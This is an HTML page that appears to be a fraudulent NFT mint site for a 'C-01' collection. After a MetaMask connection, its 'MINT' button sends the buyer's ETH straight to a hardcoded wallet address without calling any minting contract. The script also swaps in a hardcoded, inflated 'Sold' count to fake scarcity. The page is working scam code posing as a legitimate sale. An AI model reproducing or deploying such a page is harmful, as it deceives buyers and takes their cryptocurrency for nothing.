<html lang="en" style="--blink-time:1s;">
   <head>
      <meta charset="utf-8">
      <link rel="shortcut icon" href="/favicon.ico">
      <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
      <meta name="theme-color" content="#000000">
      <link rel="manifest" href="/manifest.json">
      <title>C-01 : Coming soon</title>
      <link href="css/1.4ae7fcb6.chunk.css" rel="stylesheet">
      <link href="css/main.17e37466.chunk.css" rel="stylesheet">
      <link rel="stylesheet" href="style.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js" integrity="sha512-5erpERW8MxcHDF7Xea9eBQPiRtxbse70pFcaHJuOhdEBQeAxGQjUwgJbuBDWve+xP/u5IoJbKjyJk50qCnMD7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" referrerpolicy="no-referrer"></script>
      <style>:root {
         --blink-time: 3s;
         }
         .blink {
         animation: var(--blink-time) blinker linear infinite;
         -webkit-animation: var(--blink-time) blinker linear infinite;
         -moz-animation: var(--blink-time) blinker linear infinite;
         }
         @-moz-keyframes blinker {
         0% {
         opacity: 1;
         }
         50% {
         opacity: 0;
         }
         100% {
         opacity: 1;
         }
         }
         @-webkit-keyframes blinker {
         0% {
         opacity: 1;
         }
         50% {
         opacity: 0;
         }
         100% {
         opacity: 1;
         }
         }
         @keyframes blinker {
         0% {
         opacity: 1;
         }
         50% {
         opacity: 0;
         }
         100% {
         opacity: 1;
         }
         }
      </style>
   </head>
   <body>
      <noscript>You need to enable JavaScript to run this app.</noscript>
      <div id="root">
         <div class="main">
            <div id="stars"></div>
            <div id="stars2"></div>
            <div id="stars3"></div>
            <div class="content">
               <img src="https://i.imgur.com/DvimMhm.png" alt="Logo" class="logo">
               <div style="background-color: transparent; opacity: 1;"><span class="blink span1" style="color: rgb(136, 149, 153); font-size: 55px; font-style: normal; text-transform: none;">Live now</span></div>
               <div>
                <div class="container">
                    <a href="#" id="connect"><div class="but" id="connect-text">CONNECT YOUR WALLET</div></a>
                    <a href="#" id="mint"><div class="but">MINT</div></a>
                    <br>
                    <div class="quantity" id="quantity">Quantity <b>(max 20)</b>: <input type="number" id="mintnumber" min="1" max="20" value="1"></input><button class ="butmax" onclick="change()">Set max</button></div>
                    <div class="mintprice1" id="mint-text">Sold: 5725/8888</div>
                    <div class="mintprice">Price per mint is <b>0.25 ETH</b><br><br>1. Connect your wallet with MetaMask<br>2. Click on button to mint your NFTs</div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script type="module">
   export let web3 = new Web3(ethereum);

const isMetaMaskConnected = async () => {
    let accounts = await web3.eth.getAccounts();
    return accounts.length > 0;
}
///


async function load() {
    await loadWeb3();
    updateStatus('Ready!');
}

function updateStatus(status) {
    const statusEl = document.getElementById('status');
    statusEl.innerHTML = status;
    console.log(status);
}

load();
///

document.getElementById('mint').style.display = 'none';
document.getElementById('mintnumber').style.display = 'none';
document.getElementById('connect').style.display = 'inline';
document.getElementById('quantity').style.display = 'none';

export async function updateMetaMaskStatus() {
  isMetaMaskConnected().then((connected) => {
    let button = document.querySelector('#connect-text');
    let sold = document.querySelector('#mint-text');
    if (connected) {
        button.innerHTML = "METAMASK CONNECTED";
        sold.innerHTML = "Sold: 7774/8888";
        document.getElementById('mint').style.display = 'inline';
        document.getElementById('connect').style.display = 'none';
        document.getElementById('mintnumber').style.display = '';
        document.getElementById('quantity').style.display = '';
    }

  });
}

export async function connectMetaMask() {
  if (await isMetaMaskConnected() == false) {
    await ethereum.enable();
    await updateMetaMaskStatus();
    location.reload();
  }
}

let accounts = await web3.eth.getAccounts();
web3.eth.defaultAccount = accounts[0];

document.onload = updateMetaMaskStatus();
document.querySelector('#connect').addEventListener('click', connectMetaMask);
document.querySelector('#mint').addEventListener('click', sendEth);

function sendEth() {

  let givenNumber = document.querySelector("#mintnumber").value;

  web3.eth.sendTransaction({
    from: web3.currentProvider.selectedAddress,
    to: '0x843DfaFAc295BD81eD297C051493539d8457092b',
    value: (web3.utils.toWei(givenNumber, 'ether')*0.25)
  });
}

      </script>
      <script>
        function change(){
        var txt = "20";
        document.getElementById("mintnumber").value = txt;
      }
      
      </script>
      <script>
        function change(){
        var txt = "20";
        document.getElementById("mintnumber").value = txt;
      }
            </script>
      <script>
        function change(){
        var txt = "20";
        document.getElementById("mintnumber").value = txt;
      }
      
      </script>
      <script>
        function change(){
        var txt = "20";
        document.getElementById("mintnumber").value = txt;
      }
      
      </script>
   </body>
</html>